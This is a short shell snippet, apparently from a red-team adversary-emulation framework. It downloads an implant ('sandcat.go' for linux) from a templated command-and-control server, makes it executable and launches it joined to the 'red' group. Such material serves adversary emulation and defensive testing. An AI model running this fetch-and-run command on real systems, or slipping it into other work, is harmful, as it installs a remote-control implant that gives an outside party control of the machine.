server="#{app.contact.http}";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
chmod +x #{agents.implant_name};
./#{agents.implant_name} -server $server -group red -v
